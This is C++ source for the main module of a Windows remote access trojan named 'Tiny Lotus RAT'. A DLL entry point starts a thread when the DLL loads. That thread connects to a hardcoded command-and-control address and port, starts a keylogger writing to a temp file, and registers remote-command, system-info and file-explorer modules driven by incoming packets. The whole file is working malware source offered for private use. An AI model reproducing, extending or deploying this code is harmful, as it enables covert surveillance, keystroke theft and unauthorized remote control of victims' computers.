#include "main.h"

/*
########################################################################################################################
#    Tiny Lotus RAT                                                                                                    #
#    Coded by Elvis                                                                                                    #
#    For private using only                                                                                            #
#    https://akruis.bitbucket.io/weblog%20-%20anselm-kruis.de/2012-06-03%20MSVCRT.DLL%20and%20Visual%20Studio.xhtml    #
########################################################################################################################
*/

Connection*		ConnObj;
ObjMgr*			ObjList;
RemoteCommand*	CmdObj;
Info*			InfoObj;
Keylogger*		KeyloggerObj;
FileExplorer*	FileExplorerObj;

struct config conf = {{0xCAFEBABE, 0xDEADBABE},L"TL_TEST","192.168.139.1", 6969, L"TINY_LOTUS@2sd4", true, "Tiny Lotus"};

bool Init()
{
	if (OpenMutex(SYNCHRONIZE, FALSE, conf.mutex) == NULL)
		CreateMutex(NULL, TRUE, conf.mutex);
	else
		return false;

	//Connection class
	ConnObj = new Connection(conf.hostIP, conf.port);

	//Create new obj list
	ObjList = new ObjMgr();

	//Register default obj
	CmdObj = new RemoteCommand(ConnObj);
	ObjList->RegisterObj(CmdObj);
	InfoObj = new Info(ConnObj, &conf);
	ObjList->RegisterObj(InfoObj);
	KeyloggerObj = new Keylogger(ConnObj, L"%Temp%\\Key.dat");
	ObjList->RegisterObj(KeyloggerObj);
	KeyloggerObj->Start();
	FileExplorerObj = new FileExplorer(ConnObj);
	ObjList->RegisterObj(FileExplorerObj);

	return true;
}

#define INIT_PACKET_BUFFER_SIZE		0x2000

bool Update()
{
	while(1)
	{
		while (!ConnObj->IsConnected())
			while(!ConnObj->Connect())
				Sleep(2000);

		//The skeleton
		BYTE* packetData = (BYTE*)malloc(INIT_PACKET_BUFFER_SIZE);
		size_t packetSize = INIT_PACKET_BUFFER_SIZE;
		while (ConnObj->IsConnected())
		{
			if (ConnObj->RecvRawPacket(packetData, &packetSize))
			{
				ObjList->OnPacketArrived(packetData, 0);
			}
			Sleep(100);
		}
		free(packetData);
	}
	return true;
}

bool Finish()
{
	return true;
}

void MainThread()
{
	if (!Init())
		return;
	Update();
	Finish();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	// Perform actions based on the reason for calling.
    switch( fdwReason )
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MainThread, NULL, NULL, NULL);        
        break;
    case DLL_THREAD_ATTACH:        
        // Do thread-specific initialization.
        break;        
    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.            
        break;
    case DLL_PROCESS_DETACH:        
        // Perform any necessary cleanup.
        break;    
    }
        return TRUE;
}